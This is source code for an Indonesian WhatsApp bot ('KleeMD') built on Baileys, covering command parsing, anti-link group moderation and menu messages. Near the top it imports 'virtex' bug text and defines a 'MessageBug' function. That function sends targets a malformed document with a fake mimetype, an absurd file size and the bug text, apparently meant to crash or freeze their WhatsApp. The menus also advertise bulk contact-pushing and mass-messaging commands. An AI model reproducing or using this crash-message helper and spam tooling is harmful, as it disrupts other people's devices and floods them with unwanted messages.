module.exports = async (Klee, m, store) => {
  const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")  
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const rdm = () =>{
const randomNumbers = [];
for (let i = 0; i < 10; i++) {
  const randomNumber = Math.floor(Math.random() * 10);
  randomNumbers.push(randomNumber);
}
return randomNumbers.join('')
}
const makeid = rdm()
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await Klee.decodeJid(Klee.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Klee.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata?.participants?.find((v) => v.id == botNumber) : ''
let participant_sender = isGroup ? groupMetadata?.participants?.find((v) => v.id == m.sender) : ''
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const reseller = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
const { teksbug1 } = require("./all/database/virtex.js")
const { teksbug2 } = require("./all/database/delay.js")
let isReseller = reseller.includes(m.sender)
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return Klee.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await Klee.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function KleeReply(teks) {
return Klee.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "© Powered By "+namabot, previewType: "PHOTO"}}}, {quoted: m})
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363309593185311@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By FlowFalcon`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot JPM`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak`,jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285808448146:+62 858-0844-8146\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.gconlyoff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !

Jika Anda mengalami masalah silakan chat pemilik wa.me/19026088666

Saluran: https://whatsapp.com/channel/0029Vaim5GzISTkTPWB4d51d`
return Klee.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), renderLargerThumbnail: false, title: "｢ GROUP CHAT ONLY ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Klee.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Klee.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await Klee.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Klee.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Klee.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

// CASE DI MULAI DARI SINI

switch (command) {
case "menu": case "kleemenu":{

let teksnya = `
*Haii* @${m.sender.split("@")[0]},\nAda Yang Bisa Saya Bantu Kak?

 *▧ Botname :* ${global.namabot}
 *▧ Creator :* ${global.owner1}
 *▧ Runtime :* ${runtime(process.uptime())}
 *▧ Version :* ${version} ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏


> Script KleeMD V3.0 ini masih dalam tahap pengembangan
> Dan script ini belum di rilis di publik
 `
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: Klee.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "MENU LIST", "sections": [{ "title": "# Pilih Salah Satu Menu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [
{ "header": "Allmenu", "title": "List All Fitur Bot", "id": ".allmenu" }, 
{ "header": "Mainmenu", "title": "List Main Menu", "id": ".mainmenu" }, 
{ "header": "Produkmenu", "title": "List Produk Owner", "id": ".produkmenu" }, 
{ "header": "Downloader", "title": "List Download Menu", "id": ".downloadmenu" }, 
{ "header": "Converter", "title": "List Convert Menu", "id": ".convertmenu" }, 
{ "header": "Panelmenu", "title": "List Panel Menu", "id": ".panelmenu" }, 
{ "header": "Domainmenu", "title": "List Domain Menu", "id": ".domainmenu" }, 
{ "header": "Pushkontakmenu", "title": "List Pushkontak Menu", "id": ".pushkontakmenu" }, 
{ "header": "Grupmenu", "title": "List Grup Menu", "id": ".grupmenu" }, 
{ "header": "Ownermenu", "title": "List Owner Menu", "id": ".ownermenu" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Script Bot ✈\",\"url\":\"https://flowfalcon.xyz/KleeMD/\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Klee.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "allmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ MAIN MENU ★
===============================
> play  
> tourl  
> yts  
> tohd  
> chatgpt  
> ai  
> remini  
> sticker  
> pinterest  
> qc  

===============================
★ LIST PRODUCT ★
===============================
> panel  
> vps  
> domain  
> scriptbot  

===============================
★ DOWNLOADER ★
===============================
> tiktok  
> tiktokmp3  
> tiktokaudio  
> tiktokslide  
> instagram  
> facebook  
> ytmp3  
> mediafire  

===============================
★ CONVERTER ★
===============================
> toaudio  
> tomp3  
> tovn  
> toptv  
> tts  
> toimage  

===============================
★ PANEL MENU ★
===============================
> addseller  
> delseller  
> listseller  
> addadmin  
> cpane  
> listpanel  
> listadmin  
> deladmin  
> delpanel  

===============================
★ DOMAIN MENU ★
===============================
> listdomain  
> listsubdomain  
> delsubdomain  

===============================
★ PUSH MENU ★
===============================
> pushkontak  
> pushkontak1  
> pushkontak2  
> savekontak  
> savekontak2  
> listgc  
> idgc  
> jpm  
> jpm2  
> jpmpromosi  
> jpmtesti  
> jpmhidetag  
> startjpm  
> setteksjpm  
> teksjpm  

===============================
★ GROUP MENU ★
===============================
> addmember  
> antilink  
> antilinkV2  
> hidetag  
> tagall  
> delete  
> open/close  
> setnamagc  
> setdeskgc  
> setppgc  
> kick  
> promote  
> leavegc  
> leavegc2  
> demote  

===============================
★ OWNER MENU ★
===============================
> clearsession  
> modeoff  
> modeon  
> done  
> anticall  
> autoread  
> welcome  
> setthumbnail  
> setppbotpanjang  
> setppbot  
> setnamabot  
> setbiobot 
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: 'https://www.flowfalcon.xyz/', previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "mainmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ MAIN MENU ★
===============================
> play  
> tourl  
> yts  
> tohd  
> chatgpt  
> ai  
> klee (AI Char)
> nahida (AI Char)
> remini  
> sticker  
> pinterest  
> qc  
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "downloadmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ DOWNLOADER ★
===============================
> tiktok  
> tiktokmp3  
> tiktokaudio  
> tiktokslide  
> instagram  
> facebook  
> ytmp3  
> mediafire  

`
